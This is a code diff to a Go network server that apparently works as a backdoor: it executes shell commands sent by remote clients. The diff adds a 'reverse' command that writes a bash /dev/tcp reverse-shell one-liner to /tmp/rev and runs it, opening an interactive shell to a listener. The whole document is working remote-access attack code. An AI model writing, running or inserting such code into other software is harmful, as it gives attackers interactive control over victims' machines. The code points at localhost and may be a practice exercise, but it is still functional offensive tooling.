@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"io/ioutil"
 	"fmt"
 	"log"
 	"net"
@@ -57,6 +58,8 @@ func handleConnection(conn net.Conn) {
 		conn.Write([]byte(shellExec(conn)))
 	case "whichos":
 		conn.Write([]byte(checkOS()))
+	case "reverse":
+		openReverse()
 	default:
 		conn.Write([]byte("Command not found.\n"))
 	}
@@ -84,4 +87,33 @@ func shellExec(conn net.Conn) string {
 	}
 
 	return string(stdout)
+}
+
+func openReverse() string {
+	if !fileExists("/tmp/rev"){
+		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
+		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
+		if err != nil{
+			return "Failed to write file"
+		}
+	}
+
+	cmd := exec.Command("bash", "/tmp/rev")
+
+	stdout, err := cmd.Output()
+
+	if err != nil {
+		return err.Error()
+	}
+
+	return string(stdout)
+
+}
+
+func fileExists(filename string) bool {
+    info, err := os.Stat(filename)
+    if os.IsNotExist(err) {
+        return false
+    }
+    return !info.IsDir()
 }
